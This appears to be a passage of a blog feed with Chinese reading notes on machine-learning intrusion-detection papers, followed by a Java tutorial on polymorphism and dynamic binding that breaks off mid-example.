<h3 id="1、Abstract-3"><a href="#1、Abstract-3" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>本文针对探针攻击或侦察攻击（<strong>端口扫描和主机扫描</strong>）。本文采用一种智能系统，通过将攻击的时间行为嵌入到TDNN神经网络结构中来最大化网络攻击的识别率。该系统由五个模块组成:数据包捕获引擎、预处理器、模式识别、分类和监控预警模块。</p>
<p>本系统采用<strong>主成分神经网络</strong>进行攻击识别，并通过一个分类模块将攻击分为主机扫描攻击和端口扫描攻击。我们已经在真实环境中测试了该系统，它能够检测到所有攻击。此外，使用DARPA数据集测试了该系统并与SNORT进行了比较。我们的系统在识别率和吞吐量方面优于SNORT。</p>
<h2 id="六、《Empowering-Reinforcement-Learning-on-Big-Sensed-Data-for-Intrusion-Detection》"><a href="#六、《Empowering-Reinforcement-Learning-on-Big-Sensed-Data-for-Intrusion-Detection》" class="headerlink" title="六、《Empowering Reinforcement Learning on Big Sensed Data for Intrusion Detection》"></a>六、《Empowering Reinforcement Learning on Big Sensed Data for Intrusion Detection》</h2><p>基于大感知数据的入侵检测增强学习</p>
<h3 id="1、Abstract-4"><a href="#1、Abstract-4" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>本文提出了一种大数据驱动的无线传感器网络入侵检测方法，在<strong>混合入侵检测框架上利用强化学习技术</strong>。我们研究了RL-IDS的性能，并将其与之前提出的基于自适应机器学习的IDS (AML-IDS)即自适应监督和集群混合IDS (ASCH-IDS)进行了比较。实验结果表明，RL-IDS在检测成功率、正确率和查全率上均可达到≈100%，而ASCH-IDS的正确率仅略高于99%。</p>
<h2 id="七、《A-Deep-Learning-Based-Artificial-Neural-Network-Approach-for-Intrusion-Detection》"><a href="#七、《A-Deep-Learning-Based-Artificial-Neural-Network-Approach-for-Intrusion-Detection》" class="headerlink" title="七、《A Deep Learning Based Artificial Neural Network Approach for Intrusion Detection》"></a>七、《A Deep Learning Based Artificial Neural Network Approach for Intrusion Detection》</h2><p>基于深度学习的人工神经网络入侵检测方法</p>
<h3 id="1、Abstract-5"><a href="#1、Abstract-5" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>​	本文研究了深度神经网络作为一种分类器对不同类型的入侵攻击的潜在能力。并与支持向量机(SVM)进行比较研究。实验结果表明，利用深度神经网络进行入侵检测的准确率是令人满意的。</p>
<h3 id="2、Main-work-3"><a href="#2、Main-work-3" class="headerlink" title="2、Main work"></a>2、Main work</h3><p>​		在本文中，作者分析了一个包含黑客所进行的各种攻击信息的数据集，并基于这些参数，试图预测黑客将使用的攻击类型。数据集从UCI机器学习库中获得。在本工作中采用了一种基于神经网络的深度学习方法来预测不同类型的IDS攻击。具体而言：作者使用了一个多层前馈网络来表示一个IDS的深度学习概念。前馈网络包括输入层，约400个隐层神经元和输出神经元，所使用的激活功能有整流器激活功能和softmax激活功能。</p>
<p>​		在支持向量机(SVM)中也使用了IDS集，并将其结果与神经网络的结果并置。用支持向量机得到的结果与用神经网络得到的结果是互补的。结果表明，所得结果令人满意。</p>
<h2 id="八、《Accelerated-Deep-Neural-Networks-for-Enhanced-Intrusion-Detection-System-》"><a href="#八、《Accelerated-Deep-Neural-Networks-for-Enhanced-Intrusion-Detection-System-》" class="headerlink" title="八、《Accelerated Deep Neural Networks for Enhanced Intrusion Detection System 》"></a>八、《Accelerated Deep Neural Networks for Enhanced Intrusion Detection System 》</h2><p>用于增强入侵检测系统的加速深度神经网络</p>
<h3 id="1、Abstract-6"><a href="#1、Abstract-6" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>​		深度学习是一种强大的工具，通过它可以进行彻底的包检测和攻击识别。神经网络的并行计算能力使深度神经网络(Deep neural network, DNN)能够以更快的性能有效地查看网络流量。本文提出了一种<strong>快速识别网络异常的DNN体系结构</strong>。利用NSL-KDD数据集计算训练时间，分析检测机制的有效性。</p>
<h3 id="2、Worth-recording"><a href="#2、Worth-recording" class="headerlink" title="2、Worth recording"></a>2、Worth recording</h3><p>​		SRI国际[15]公司的Denning公司提供了入侵检测专家系统的解决方案。它采用了一种双重方法，一个基于规则的专家系统来检测已知类型的入侵，以及一个基于用户、主机系统和目标系统配置文件的统计异常检测组件。随后，该组织又发布了新版本的“下一代入侵检测专家系统[16]”。随着DARPA在1998年和1999年与MIT联合发布的入侵检测评估[17]，在信息安全中使用异常检测的概念成为主流。在[18]中表明DARPA的数据集不适合模拟实际的网络系统。这就需要开发用于IDS开发的新数据集。在入侵检测系统的开发中使用了多种机器学习技术。在[19][20]中详细讨论了每种技术及其优缺点。在这些调查中，一种很有前途的IDS机器学习技术是神经网络。神经网络由一组动作组成，通过一组简单的处理单元或节点和它们之间的连接，将一组输入转换为一组搜索输出。采用基于监督学习技术的多层感知器[21]和基于无监督学习技术的自组织映射[22]开发了入侵检测系统。基于误用检测模型[23]和异常检测模型[23]的神经网络是提高IDS性能的有效方法。一些研究人员利用不同的现有数据集对他们开发的IDS[24]进行性能评估。</p>
<p>​	[25]研究表明，现代入侵检测系统难以处理高速网络流量。其他人[26]已经展示了攻击者如何利用这一事实，<strong>在执行攻击时用无关信息重载IDS</strong>来隐藏他们的攻击行为。</p>
<h3 id="3、Main-work"><a href="#3、Main-work" class="headerlink" title="3、Main work"></a>3、Main work</h3><h4 id="（1）Pre-processing"><a href="#（1）Pre-processing" class="headerlink" title="（1）Pre-processing"></a>（1）Pre-processing</h4><p>基于神经网络的分类只使用数值进行训练和测试。因此需要一个预处理阶段来将非数值转换为数值。预处理的两个主要任务是:</p>
<ul>
<li>将数据集中的非数值特征转换为数值。特征2、3、4(协议类型、服务和标志)是非数值的。</li>
<li>将数据集结尾的攻击类型转换为数值类别。赋值1为正常数据。其中2、3、4、5分别为DoS、Probe、R2L、U2R攻击类型。</li>
</ul>
<h4 id="（2）Normalization"><a href="#（2）Normalization" class="headerlink" title="（2）Normalization"></a>（2）Normalization</h4><p>由于NSL-KDD数据集的特征值要么是离散的，要么是连续的，特征值的范围是不同的，这使得它们无法进行比较。因此，我们使用min-max归一化[41]对特征进行归一化，将每个特征的所有不同值映射到[0,1]范围内。</p>
<h4 id="（3）Deep-Neural-Networks"><a href="#（3）Deep-Neural-Networks" class="headerlink" title="（3）Deep Neural Networks"></a>（3）Deep Neural Networks</h4><p>深度神经网络(DNN)从输入中学习分层表示，以完成必要的分类任务。一个DNN由卷积层、最大池和全连接层组成。通过最小化训练集上的误分类误差，对所有可调参数进行联合优化。DNN是一种前馈人工神经网络，在输入和输出之间有一层以上的隐藏单元。这些多重隐藏层对于解决复杂数据的分类问题非常有用。每一层都可以学习不同抽象级别的特性。DNN的多个隐藏层的训练在实践中是很困难的。</p>
<ul>
<li>低层和高层的梯度大小是不同的</li>
<li>随机梯度下降法很难根据目标函数的地形或曲率找到一个好的局部最优</li>
<li>深度网络的参数较多，能够记忆训练数据，但泛化效果不佳</li>
</ul>
<p>为了使训练过程有效，我们选择一次训练一层DNN。这是通过为每个期望的隐藏层训练一种被称为自动编码器的特殊类型的网络来实现的</p>
<p>​	<strong>自动编码器</strong>有许多有趣的应用，如数据压缩、可视化等。研究人员[14]观察到，自动编码器可以作为一种“预训练”神经网络的方法。DNN的训练前过程分为以下几个步骤:</p>
<ul>
<li>训练前步骤:使用无监督数据，贪婪地每次训练一层浅层自动编码器序列</li>
<li>微调步骤1：使用监督数据训练最后一层</li>
<li>微调步骤2：使用反向传播使用监督数据微调整个网络</li>
</ul>
<p>这种训练前的想法**可以改善DNN;**也许是因为预训练是一次一层完成的，这意味着它不会遭受完全监督学习的困难。</p>
<p>自编码器学习算法，这是一种从未标记数据中自动学习特征的方法。尽管这种方法本身并不能与最好的手工设计功能相竞争，但它可以学习的功能确实被证明对[45]的一系列问题是有用的。</p>
<h4 id="4、Conclusion"><a href="#4、Conclusion" class="headerlink" title="4、Conclusion"></a>4、Conclusion</h4><p>​		本研究主要集中在利用加速器平台处理庞大的数据集，找出输入数据集上的复杂关系，以识别不同的攻击类型。基于DNN的加速入侵检测系统就是为此而开发的。实验结果表明，该算法能够识别输入数据之间的关系。这说明基于DNN的IDS在入侵检测中是可靠和高效的，能够识别出需要训练样本数的特定攻击类别(见表3中的DoS和Probe攻击)，而不能有效地对需要训练样本数最少的攻击类型进行分类(见表3中的R2L和U2R)。</p>
<h2 id="九、《Intrusion-Detection-Using-Convolutional-Neural-Networks-for-Representation-Learning》"><a href="#九、《Intrusion-Detection-Using-Convolutional-Neural-Networks-for-Representation-Learning》" class="headerlink" title="九、《Intrusion Detection Using Convolutional Neural Networks for Representation Learning》"></a>九、《Intrusion Detection Using Convolutional Neural Networks for Representation Learning》</h2><p>基于卷积神经网络的表示学习入侵检测</p>
<h3 id="1、Abstract-7"><a href="#1、Abstract-7" class="headerlink" title="1、Abstract"></a>1、Abstract</h3><p>​		基于深度学习的入侵检测方法在表示学习中得到了广泛的尝试。然而，在各种用于入侵检测的深度学习模型中，很少有<strong>卷积神经网络</strong>(convolutional neural networks, CNN)模型。在这项工作中，我们提出了一种<strong>NSL-KDD数据的图像转换方法</strong>。通过提出的图形转换技术，卷积神经网络自动学习图形NSL-KDD变换的特征。我们使用NSL-KDD Test+和Test−21进行二值分类实验，评估图像转换方法的性能。证明了CNN的不同结构进行比较。在两个NSL-KDD测试数据集上，CNN的表现优于大多数标准分类器，尽管CNN并没有完全改善现状。实验结果表明，CNN模型对攻击数据的图像转换非常敏感，可以用于入侵检测。</p>
<h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3><p>​	近年来，深度学习发展很快，在很多场景[11]中都取得了很好的效果。许多学者尝试使用深度学习技术进行异常检测。提出了各种类型的用于异常检测的深度学习方法。这些技术包括:<strong>Self -Taught Learning, Deep Belief Networks, Auto Encoder, LSTM</strong>等[5 - 7,14,16]。这些特征学习方法和模型在一定程度上取得了成功，并匹配或超越了最先进的技术。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Intrusion detection</tag>
        <tag>situational awareness</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(六)——多态</title>
    <url>/2022/09/14/23-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)%E2%80%94%E2%80%94%E5%A4%9A%E6%80%81%20/</url>
    <content><![CDATA[<h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>方法和对象具有多种形态。是面向对象的第三大特征，多态是建立在封装和继承基础之上的。</p>
<h2 id="例子引出多态"><a href="#例子引出多态" class="headerlink" title="例子引出多态"></a>例子引出多态</h2><p>假设有一个主人Master类，其中有一个feed（喂食）方法，可以完成主人给动物喂食的信息。假设Food类有两个子类：Fish和Bone，动物Animal类有两个子类Cat和Dog。根据前面知识可以写出代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Animal类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Dog子类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Cat子类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bone</span> <span class="keyword">extends</span> <span class="title class_">Food</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Bone</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Food父类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Food</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Food</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Fish子类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_">Food</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fish</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Bone子类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bone</span> <span class="keyword">extends</span> <span class="title class_">Food</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Bone</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Master类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Master</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Master</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(Dog dog,Bone bone)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主人  &quot;</span>+name+<span class="string">&quot;给  &quot;</span>+dog.getName()+<span class="string">&quot;吃  &quot;</span>+bone.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(Cat cat,Fish fish)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主人  &quot;</span>+name+<span class="string">&quot;给  &quot;</span>+cat.getName()+<span class="string">&quot;吃  &quot;</span>+fish.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里如果动物、食物有很多种呢？是不是要写很多种不同的方法来重载？</span></span><br><span class="line">    <span class="comment">//====&gt;  feed方法很多，不利于管理和维护</span></span><br><span class="line">    <span class="comment">//====&gt;  引出对象的多态性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主程序</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poly01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Master</span> <span class="variable">tom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Master</span>(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;大黄&quot;</span>);</span><br><span class="line">        <span class="type">Bone</span> <span class="variable">bone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bone</span>(<span class="string">&quot;排骨&quot;</span>);</span><br><span class="line">        tom.feed(dog,bone);</span><br><span class="line"></span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;汤姆&quot;</span>);</span><br><span class="line">        <span class="type">Fish</span> <span class="variable">fish</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fish</span>(<span class="string">&quot;小鱼&quot;</span>);</span><br><span class="line">        tom.feed(cat,fish);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到feed方法通过重载的方式来实现对不同类别动物的喂食操作，这样如果动物、食物种类很多，那是不是意味着要写很多种不同的方法来重载呢？</p>
<p>这个问题可以通过<span style='color:orange'>对象的多态性</span>来解决。</p>
<h2 id="多态基本介绍"><a href="#多态基本介绍" class="headerlink" title="多态基本介绍"></a>多态基本介绍</h2><p>方法的多态：重写和重载 。</p>
<p><span style='color:red'>对象的多态（核心）：</span></p>
<ul>
<li>1、一个对象的编译类型和运行类型可以不一致</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以父类Animal和子类Dog为例：</span></span><br><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();<span class="comment">//animal编译类型是Animal，运行类型是Dog</span></span><br><span class="line"><span class="comment">//强调：这里的animal是一个对象引用，并不是一个对象，而后面new的这个Dog()才是一个真正的对象。</span></span><br><span class="line"><span class="comment">//这里也就是说：一个父类的引用可以指向一个子类的对象</span></span><br></pre></td></tr></table></figure>

<ul>
<li>2、编译类型在定义对象时，就确定了，不能改变</li>
<li>3、运行类型是可以变化的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接着上面那个例子</span></span><br><span class="line">animal = <span class="keyword">new</span> <span class="title class_">Cat</span>()；</span><br><span class="line"><span class="comment">//animal的运行类型变成了Cat，但是编译类型仍然是Animal</span></span><br></pre></td></tr></table></figure>

<ul>
<li>4、编译类型看定义时&#x3D;号的左边，运行类型看&#x3D;号的右边。</li>
</ul>
<p>了解了方法和对象的多态性之后，可以对上面例子的代码进行简化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Master类</span></span><br><span class="line"><span class="keyword">package</span> com.learn.poly_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Master</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Master</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用多态机制可以统一管理主人喂食物的问题</span></span><br><span class="line">    <span class="comment">//animal编译类型是Animal，可以指向（接收）Animal子类的对象</span></span><br><span class="line">    <span class="comment">//food 编译类型是Food，可以指向（接收）Food子类的对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(Animal animal,Food food)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主人  &quot;</span>+name+<span class="string">&quot;给  &quot;</span>+animal.getName()+<span class="string">&quot;  吃  &quot;</span>+food.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void feed(Dog dog,Bone bone)&#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;主人  &quot;+name+&quot;给  &quot;+dog.getName()+&quot;  吃  &quot;+bone.getName());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public void feed(Cat cat,Fish fish)&#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;主人  &quot;+name+&quot;给  &quot;+cat.getName()+&quot;  吃  &quot;+fish.getName());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用多态机制后，就算想要添加新的类，也不需要重写Master类，只需要添加新的类别，在主函数中new对象即可，大大提高了写代码的效率，以及代码的复用性。</p>
<h2 id="多态的细节和注意事项"><a href="#多态的细节和注意事项" class="headerlink" title="多态的细节和注意事项"></a>多态的细节和注意事项</h2><ul>
<li><p>多态的前提是：两个对象（态）是存在继承关系</p>
</li>
<li><p>多态的向上转型：</p>
<ul>
<li>1、本质：父类的引用指向了子类的对象</li>
<li>2、语法：父类类型 引用名 &#x3D; new 子类类型()；</li>
<li>3、特点：编译类型看左边，运行类型看右边。遵守的规则：<ul>
<li>（1）可以调用父类中的所有成员（需遵守访问权限）</li>
<li>（2）不能调用子类中的特有成员（<span style='color:red'>因为在编译阶段，能调用哪些成员是由编译类型来决定的</span>）；</li>
<li>（3）最终运行效果看子类（运行类型）的具体实现（即调用方法时，<span style='color:red'>按照从子类开始查找方法，然后去调用</span>，规则和前面讲的方法调用规则一致）。</li>
</ul>
</li>
</ul>
</li>
<li><p>多态的向下转型：</p>
<ul>
<li>1、语法：子类类型 引用名 &#x3D; （子类类型）父类引用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向上转型</span></span><br><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line"><span class="comment">//向下转型</span></span><br><span class="line"><span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> (Cat) animal;</span><br><span class="line">cat.privateMethod();</span><br><span class="line"><span class="comment">//这里cat的编译类型是Cat，运行类型也是Cat。这样向下转型后，有两个引用指向Cat()这个对象，一个是Animal类的引用，一个是Cat类的引用，没有动原先的animal,原先的animal依然不可以访问Cat对象中特有的方法。</span></span><br><span class="line"><span class="comment">//感觉直白来说，就是少用一个new字，节省空间？而且再new一个cat也不是原来的cat了</span></span><br></pre></td></tr></table></figure>

<ul>
<li>2、只能强转父类的引用，不能强转父类的对象</li>
<li>3、要求父类的引用必须指向的是当前目标类型的对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line"><span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> (Cat) animal;<span class="comment">//编译通过，运行正确</span></span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) animal;<span class="comment">//编译通过，但运行错误，抛出异常</span></span><br></pre></td></tr></table></figure>

<ul>
<li>4、当向下转型后，可以调用子类类型中的所有成员</li>
</ul>
</li>
<li><p>属性没有重写之说！属性的值看编译类型</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PolyDetail02</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="comment">//属性没有重写之说！属性的值看编译类型</span></span><br><span class="line">		<span class="type">Base</span> <span class="variable">base</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Sub</span>();</span><br><span class="line">		System.out.println(base.count);<span class="comment">//输出的是哪个count？答案是10</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>&#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span> <span class="keyword">extends</span> <span class="title class_">Base</span>&#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>instanceOf比较操作符，用于判断对象的<span style='color:red'>运行类型</span>是否为XX类型或XX类型的子类型</li>
</ul>
<h2 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a><span style='color:red'>动态绑定机制</span></h2><p>java重要特性：动态绑定机制</p>
<ul>
<li>1、当调用对象方法的时候，该方法会和该对象的<span style='color:red'>内存地址&#x2F;运行类型绑定</span>（因为运行类型是在堆中，有一个地址）。</li>
<li>2、当调用对象属性时，没有动态绑定机制，<span style='color:red'>哪里声明，哪里使用</span></li>
</ul>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;<span class="comment">//父类</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> getI()+<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum1</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i+<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getI</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i;</span><br><span class="line">	&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;<span class="comment">//子类</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i+<span class="number">20</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum1</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i+<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getI</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i;</span><br><span class="line">	&#125;	  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main方法中</span></span><br><span class="line"><span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();<span class="comment">//向上转型</span></span><br><span class="line">System.out.println(a.sum());<span class="comment">//输出40</span></span><br><span class="line">System.out.println(a.sum1());<span class="comment">//输出30</span></span><br></pre></td></tr></table></figure>

<p>第二种情况：假设子类中的sum()被注释了，输出为何？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;<span class="comment">//父类</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">  <span class="comment">//动态绑定机制</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> getI()+<span class="number">10</span>;<span class="comment">//20+10</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sum1</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i+<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span 